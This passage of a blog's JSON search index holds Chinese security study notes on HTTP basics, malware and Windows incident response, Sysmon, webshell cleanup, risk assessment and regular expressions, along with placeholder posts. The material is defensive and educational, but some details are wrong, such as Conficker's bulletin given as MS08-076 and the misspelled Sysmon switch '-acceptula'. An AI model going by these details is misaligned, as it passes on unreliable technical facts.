Google和Shodan的区别Google的爬虫/蜘蛛 抓取网页数据并为网页内容创建索引。Shoudan主要寻找端口并抓取拦截到的信息，然后为它们建立索引，最后显示结果。Shoudan并不像google那样为网页内容建立索引，因此它是一个基于拦截器的搜索引擎。 whois信息收集Whois可以获取的信息 通过Whois信息可以？) DNS查询","tags":[{"name":"渗透测试;信息收集","slug":"渗透测试-信息收集","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Web渗透","slug":"渗透测试/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透测试/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"第一节 HTTP请求流程","date":"2020-07-07T11:17:37.000Z","path":"wiki/渗透测试/Web渗透/学习笔记/第一节 HTTP请求流程/","text":"0x01 HTTP协议分析123sequenceDiagram客户端-&gt;&gt;服务器: 1、request服务器-&gt;&gt;客户端: 2、response 0x02 HTTP请求与响应1.请求12345POST &#x2F;test.php HTTP&#x2F;1.1 &#x2F;&#x2F;请求行HOST：www.test.com &#x2F;&#x2F;请求头User-Agent：Mozilla&#x2F;5.0 （windows NT 6.1；rv：15.0）Gecko&#x2F;20100101 Firefox&#x2F;15.0 &#x2F;&#x2F;空白行，代表请求头结束Username&#x3D;admin&amp;password&#x3D;admin &#x2F;&#x2F;请求正文 2.响应12345678910111213HTTP&#x2F;1.1 200 OK &#x2F;&#x2F;响应行Date: Sun, 15 Nov 2015 11:02:04 GMT &#x2F;&#x2F;响应头Server: bfe&#x2F;1.0.8.9Content-Length: 2605Content-Type: application&#x2F;javascriptCache-Control: max-age&#x3D;315360000Expires: Fri, 13 Jun 2025 09:54:00 GMTContent-Encoding: gzipSet-Cookie: H_PS_PSSID&#x3D;2022_1438_1944_1788; path&#x3D;&#x2F;; domain&#x3D;test.comConnection: keep-alive &#x2F;&#x2F;空白行，代表响应头结束&lt;html&gt;&lt;head&gt;&lt;title&gt; Index.html &lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &#x2F;&#x2F;响应正文或者叫消息主题 0x03 HTTP请求方法 GET：GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（非HTML），那么返回文本是Web容器解析后的HTML源代码。GET请求没有消息主体，因此在消息头后的空白行是没有其他数据。 POST：POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容，而POST是有请求内容的。 HEAD：这个请求的功能与GET请求相似，不同之处在于服务器不会再其响应中返回消息主体，因此，这种方法可用于检查某一资源在向其提交GET请求前是否存在。 PUT：PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据。向服务器上传指定的资源。 0x04 HTTP状态码 1xx：信息提示，表示请求已被成功接收，继续处理。 2xx：请求被成功提交。 3xx：客户端被重定向到其他资源。 4xx：客户端错误状态码，格式错误或者不存在资源。 5xx：描述服务器内部错误。 常见的状态码描述如下： 200：客户端请求成功，是最常见的状态。 302：重定向。 404：请求资源不存在，是最常见的状态。 400：客户端请求有语法错误，不能被服务器所理解。 401：请求未经授权。 403：服务器收到请求，但是拒绝提供服务。 500：服务器内部错误，是最常见的状态。 503：服务器当前不能处理客户端的请求。 0x05 HTTP消息头请求头 Host 请求报头域主要用于指定被请求资源的Internet主机和端口。 User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。 Referer 包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。当前请求的原始URL地址。 Cookie 是非常重要的请求头，常用来表示请求者的身份等。 Accept 这个消息头用于告诉服务器客户端愿意接受那些内容，比如图像类，办公文档格式等等。 可直接在浏览器中利用的输入点：请求行，请求正文黑客在实际利用中的输入点：请求行，referer，user-agent，cookie，请求正文 响应头 Server 服务器使用的Web服务器名称。 Location 服务器通过这个头告诉浏览器去访问哪个页面，浏览器接收到这个请求之后，通常会立刻访问Location头所指向的页面。用于在重定向响应中说明重定向的目标地址。 Content-Type 这个消息头用于规定主体的内容类型。例如，HTML文档的内容类型text/html。 Content-Encoding 这个消息头为消息主体中的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。 Content-Length 消息头规定消息主体的字节长度。实体头用于指明实体正文的长度，以字节方式存储的十进制数字来表示。 Connection 允许发送指定连接的选项。 0x06 拦截HTTP请求 Fiddler Burp Suite","tags":[{"name":"渗透测试 HTTP协议","slug":"渗透测试-HTTP协议","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTP%E5%8D%8F%E8%AE%AE/"}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Web渗透","slug":"渗透测试/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透测试/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"","date":"2020-06-25T17:35:03.345Z","path":"wiki/渗透测试/IOT渗透/病毒初级应急响应/","text":"[toc] 常见病毒类型和特点常见分类蠕虫文件夹 飞客蠕虫（conficker）445端口传播，利用MS08-076漏洞发起攻击。中毒症状包括请求解析随机域名（DGA）、不能正常访问安全厂商的网站或服务器、下载木马。详情 文件夹蠕虫（FakeFolder）设置源文件夹隐藏属性，并且自己伪装成文件夹，通过修改注册表系统属性，通常通过共享、U盘传播。 Morto蠕虫通过RDP爆破传播，通过注册表、服务等进行驻留。 NetSky蠕虫获取本地邮箱地址，通过邮件服务器传播包含病毒体的邮件 挖矿病毒Wannamine系列木马感染型病毒（不能做清除，而是做修复）Ramnit感染html文件，插入vbs脚本，会进行客户端vbs脚本传播。详情 宏病毒文档类， 勒索病毒感染文件，勒索赎金，没办法破解 应急工具基础工具Process Hacker procexp &gt; 进程操作，服务操作Autoruns &gt; 计划任务，启动项，服务，WMIEverything &gt; 文件搜索PChunter &gt; 文件，驱动（驱动型工具，可以绕过应用层的防护） 进阶工具Sysmon安装：Sysmon.exe -acceptula -i -n日志路径：%system%\\system32\\winevt\\logs\\microsoft-windows=sysmon%4Operational.evtx卸载：sysmon.exe -u 流行病毒查杀思路勒索时间信息收集是否正在进行加密“徒手杀毒”招式分解观察对象恶意软件商最爱的目录排行快速判断文件“黑白”安全软件报出的文件判断木马类 - Trojan Backdoop如果不是业务程序软件，建议隔离四段式：Trojan.Win32.Wannamine.ufajg其他：TR/Lokibot.gen 借助威胁情报判断文件威胁通过沙箱判断行为其他补充技巧 图标和文件类型是否对应 看似正常系统文件，看MD5 是否具有签名 强壳、混淆 常见应急工具## 分析工具Process Hacker常见病毒处置常见挖矿病毒处置中挖矿木马的计算机，资源会被大量占用，用于数字加密币的挖掘。 挖矿病毒的原理stratum协议是目前最常用的矿机和矿池之间的TCP协议。以下是挖矿的网络结构： 挖矿病毒分析一般挖矿病毒的最明显特征：进程资源占用高50%/25%/100%，可通过判断通信地址为矿池来判断终端可能再进行挖矿。验证挖矿主机常用以下工具： 微步在线 搜索引擎 wireshark、tcpdump等抓包工具 发现挖矿程序，一般会伴随着自启动操作。服务：tasklist /svc、process hacker 1HKEY_LOCAL_MACHINE\\SYSTEM\\Microsoft\\WindowsNT\\CurrentControlSet\\Services 任务计划：taskschd.msc 启动项：VMI：autoruns/wbemtestIPSec：deny445Rookit隐藏：驱动隐藏、attrib -r -s -h、cacls、“file” /g administrator:f","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IOT渗透","slug":"渗透测试/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"","date":"2020-06-25T17:35:03.343Z","path":"wiki/渗透测试/IOT渗透/Windows应急响应排查/","text":"[toc] 一、进程排查独立进程块病毒是独立的可执行文件，以独立进程运行。进程名要么随机，要么相似于系统进程 动态库模块以动态库的方式注入到系统进程和应用程序。 隐藏模块二、网络行为排查重要辅助站点 https://www.virustotal.com/国外知名站点网络连接排查流量分析漏洞与补丁信息三、文件排查临时目录排查 浏览器相关文件排查最近打开文件排查文件时间排查其他重要目录查询system32也是常见的病毒释放目录，需检查hosts文件有没有被篡改。 12C:\\Windows\\System32C:\\Windows\\System32\\drivers\\etc\\hosts 四、远程登录排查Windows日志RDP远程登录排查SMB五、启动方式排查启动项排查任务计划排查服务排查六、账号安全排查compmgmt.msc命令查看计算机上所有用户信息net user 用户名 命令查看指定用户信息 通过PCHunter等工具可以查看隐藏用户，如添加$的隐藏账号，以及克隆账号。","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IOT渗透","slug":"渗透测试/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"","date":"2020-06-25T17:35:03.333Z","path":"wiki/渗透测试/IOT渗透/Windows系统监控Sysmon/","text":"[toc] sysmon简介用于监视和记录系统活动，并记录到Windows时间日志，可提供有关进程的创建、网络连接和文件创建时间更改的详细信息。通过集成Windows事件集合或SIEM代理生成的事件，然后分析他们，可识别恶意或异常活动，并了解在网络上是如何的恶意操作。 安装与配置安装命令： 1Sysmon64.exe -acceptula -i z-AlphaVersion.xml 日志分析","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IOT渗透","slug":"渗透测试/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"","date":"2020-06-25T17:35:03.331Z","path":"wiki/渗透测试/IOT渗透/web初级应急响应/","text":"[toc] web入侵简介web入侵流程信息收集 &gt; 漏洞扫描 &gt; 渗透攻击 &gt; 提权/挂黑链 &gt; 后渗透攻击 &gt; 持续控制 web入侵方法 通过web脚本或框架的漏洞获取webshell 通过获取cms的后台账号密码并登录 通过数据库开放的端口作为入口，爆破或猜解进入 通过web脚本或框架漏洞获取敏感权限或数据web恶意代码事件 WEBSHELL 黑链广告文件 恶意挂马页面web应用应急响应流程确认攻击类型 &gt; 异常信息收集 &gt; 排查黑链 &gt; 排查webshell &gt; 分析web日志 &gt; 时间总结web应急响应需要处理的问题 发现黑链/暗链跳转等被篡改现象 发现webshell等黑帽SEO-黑链SEO-搜索引擎优化利用搜索引擎的规则提高有关搜索引擎内的自然排名SEO目的搜索结果排名靠前SEO帽子白：遵循规则进行网络推广黑：不遵循规则黑帽SEO-黑链 黑链的排查思路复现黑链存在的现象（搜索引擎复现、多地域访问、终端及服务器端抓包） Webshell查杀Webshellwebshell是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后门，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 常见工具 名称 平台 下载 D盾 Windows http://www.d99net.net/ 悬镜（慎用） Linux http://www.xmirror.cn/ 360主机卫士 Windows/Linux http://zhuji.360.cn/ webshell.pub Windows/Linux http://www.webshell.pub/ 安全狗 Windows/Linux http://www.safedog.cn/ Sangfor WebshellKiller 3.2 Windows/Linux ### 查杀方法 #### 工具扫描 #### 文件属性（创建时间、修改时间） #### 文件特征（静态特征、动态特征） #### 文件对比 #### 搜索引擎 将代码拖去搜索引擎搜索是否为webshell。 确认webshell之后删除即可 ## Web应急案例讲解 ### ## 日志分析 ### 1.Windows日志分析 2.Web日志分析web日志分类常规日志分析主要关注 1102 &gt; 清理审计日志 4624 &gt; 账号登录成功 4625 &gt; 账号登录失败","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IOT渗透","slug":"渗透测试/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"风险评估相关概念","date":"2020-06-25T16:13:37.000Z","path":"wiki/安全服务/风险评估/风险评估相关概念/","text":"0x00 风险的起源“风险”一次来源已久。最普通的说法是：以打鱼为生的渔民们，每次出行前都要祈祷，祈求神灵保佑自己平安归来。其中祈祷的主要内容就是让神灵保佑自己在出海时候能够风平浪静、满载而归；域名们在长期的捕捞实践中，深深的体会到“风”给他们带来的无法预测和无法确定的危险，在出海打渔的过程中的，“风”即意味着显“险”，“风险”一词因此而得来。 0x01 风险的定义在信息安全，风险（risk）就是指各种威胁导致安全事件发生的可能性及其对组织所造成的负面影响。 0x02 风险的特性 客观性：不以人的意志为转移的客观存在。 必然性：伴随着事物发展不可避免。 社会性：后果对社会的影响很大。（如：天灾人祸） 普遍性：存在于事物之中，贯穿于整个生命的周期。 相对性：因时空等元素变化而变化。 时效性：风险随着时间的推移而产生变化。 不确定性：发生时间、损失、是否发生都不确定。 损失性：风险事件存在，就有造成损失的可能性。 可识别性：通过分析事物的内外因素，可识别风险。 可控性：采取一定的控制措施，可以把风险损失控制在一定的范围内。其中8、9、10可以解释为什么要研究风险。","tags":[{"name":"风险评估 概念","slug":"风险评估-概念","permalink":"https://s40d1.github.io/tags/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0-%E6%A6%82%E5%BF%B5/"}],"categories":[{"name":"安全服务","slug":"安全服务","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"},{"name":"风险评估","slug":"安全服务/风险评估","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"}]},{"title":"Hello World","date":"2020-06-24T02:08:49.252Z","path":"wiki/渗透测试/IOT渗透/新建文本文档/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IOT渗透","slug":"渗透测试/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/"}]},{"title":"article title","date":"2020-06-23T16:13:37.000Z","path":"wiki/风险评估/第一篇文章/","text":"第一篇文章","tags":[],"categories":[{"name":"风险评估","slug":"风险评估","permalink":"https://s40d1.github.io/categories/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"}]},{"title":"article title","date":"2020-06-23T16:13:37.000Z","path":"wiki/红蓝对抗/第一篇文章/","text":"第一篇文章","tags":[],"categories":[{"name":"红蓝对抗","slug":"红蓝对抗","permalink":"https://s40d1.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"}]},{"title":"article title","date":"2020-06-23T16:13:37.000Z","path":"wiki/代码审计/第一篇文章/","text":"第一篇文章","tags":[],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://s40d1.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"article title","date":"2020-06-23T16:13:37.000Z","path":"wiki/CTF/第一篇文章/","text":"第一篇文章","tags":[],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://s40d1.github.io/categories/CTF/"}]},{"title":"article title","date":"2020-06-23T16:13:37.000Z","path":"wiki/攻防演练/第一篇文章/","text":"第一篇文章","tags":[],"categories":[{"name":"攻防演练","slug":"攻防演练","permalink":"https://s40d1.github.io/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"}]},{"title":"正则表达式30分钟入门40分钟进阶","date":"2020-06-23T16:13:37.000Z","path":"wiki/安全开发/正则表达式/正则表达式30分钟入门40分钟进阶/","text":"正则练习网址： https://www.codejiaonang.com/正则在线测试网站： https://regexr-cn.com/ 一、正则表达式入门1.1字符组正则表达式中字符组使用中括号（[]）包裹，作用是匹配中括号里面的元素任意一次。如下： 1.1.1字符组中横杠（-）表示区间字符组中可以使用横杠来表示区间，省去大量写操作。如图： 1.1.2特殊字符需转义如果需要再字符组内对横杠(包括其他特殊字符)进行匹配，需要再“-”前面加上转义字符： 1.1.3取反如果不想取某一类字符可使用“^”对其取反，如下图： 总结 1.2快捷方式1.2.1 \\d匹配数字 \\w匹配字符(特殊字符除外)\\d表示匹配所有数字，\\w表示匹配所有字符，如下图： 1.2.2 \\s匹配空格可以使用\\s来匹配空格和缩进： 1.2.3匹配单词边界匹配内容中完整的单词： 1.2.4快捷方式取反将\\W为\\w的取反，\\D为\\d的取反，\\S为\\s的取反。如： 1.2.4开始和结束目标前使用^可以匹配开始位置字符，在目标后使用$可以匹配结束位置的字符： 1.2.5任意字符使用点（.）可以匹配任意字符（除换行符即\\n）： 1.2.6 可选字符匹配一个可以出现也可以不出现的字符： 总结 1.3匹配多个数据1.3.1 重复次数在所需要匹配的字符后面加上大括号，里面填充数字，这个数字表示重复的次数： 1.3.2 重复区间使用大括号内的数字区间可匹配响应范围个数的字符：如果在后面加上了?，就会只匹配区间开始数量的字符，在这里?表示非贪婪模式：如果大括号使用前闭后开的形式，表示匹配第一元素开始以上的内容： 1.3.3 开闭区间+相当于{1，}，*相当于{0，}： 1.3.4 匹配所有手机号码 1.3.4 匹配所有网址 二、正则表达式进阶2.1分组与溯回引用2.1.1分组在正则表达式中还提供了一种将表达式分组的机制，当使用分组时，除了获得整个匹配。还能够在匹配中选择每一个分组。要实现分组使用()即可。如下： 2.1.2 或者条件使用分组的同时还可以使用 或者（or）条件： 2.1.3 非捕获分组有时候，我们并不需要捕获某个分组的内容，但是又想使用分组的特性。这个时候就可以使用非捕获组(?:表达式)，从而不捕获数据，还能使用分组的功能。 2.1.4 回溯引用那如果想让后面分组的正则和第一个分组的正则匹配同样的数据可以使用分组的回溯引用，使用\\N可以引用编号为N的分组，如下： 2.2先行断言2.2.1 正向先行断言正向先行断言：(?=表达式)，指在某个位置向右看，表示所在位置右侧必须能匹配表达式，但只提取该位置的数据： 2.2.1 反向先行断言反向先行断言(?!表达式)的作用是保证右边不能出现某字符 2.3后行断言正向后行断言正向后行断言：(?&lt;=表达式)，指在某个位置向左看，表示所在位置左侧必须能匹配表达式 反向后行断言反向后行断言：(?&lt;!表达式)，指在某个位置向左看，表示所在位置左侧不能匹配表达式","tags":[{"name":"正则 表达式","slug":"正则-表达式","permalink":"https://s40d1.github.io/tags/%E6%AD%A3%E5%88%99-%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"categories":[{"name":"安全开发","slug":"安全开发","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"正则表达式","slug":"安全开发/正则表达式","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"article title","date":"2020-06-23T16:13:37.000Z","path":"wiki/渗透测试/IOT渗透/第一篇文章/","text":"第一篇文章","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"IOT渗透","slug":"渗透测试/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/"}]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Web渗透","slug":"渗透测试/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透测试/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"IOT渗透","slug":"渗透测试/IOT渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IOT%E6%B8%97%E9%80%8F/"},{"name":"安全服务","slug":"安全服务","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"},{"name":"风险评估","slug":"安全服务/风险评估","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"name":"风险评估","slug":"风险评估","permalink":"https://s40d1.github.io/categories/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"},{"name":"红蓝对抗","slug":"红蓝对抗","permalink":"https://s40d1.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"},{"name":"代码审计","slug":"代码审计","permalink":"https://s40d1.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"CTF","slug":"CTF","permalink":"https://s40d1.github.io/categories/CTF/"},{"name":"攻防演练","slug":"攻防演练","permalink":"https://s40d1.github.io/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"},{"name":"安全开发","slug":"安全开发","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"正则表达式","slug":"安全开发/正则表达式","permalink":"https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://s40d1.github.io/tags/XSS/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://s40d1.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"CSRF","slug":"CSRF","permalink":"https://s40d1.github.io/tags/CSRF/"},{"name":"渗透测试;信息收集","slug":"渗透测试-信息收集","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"渗透测试 HTTP协议","slug":"渗透测试-HTTP协议","permalink":"https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTP%E5%8D%8F%E8%AE%AE/"},{"name":"风险评估 概念","slug":"风险评估-概念","permalink":"https://s40d1.github.io/tags/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0-%E6%A6%82%E5%BF%B5/"},{"name":"正则 表达式","slug":"正则-表达式","permalink":"https://s40d1.github.io/tags/%E6%AD%A3%E5%88%99-%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]}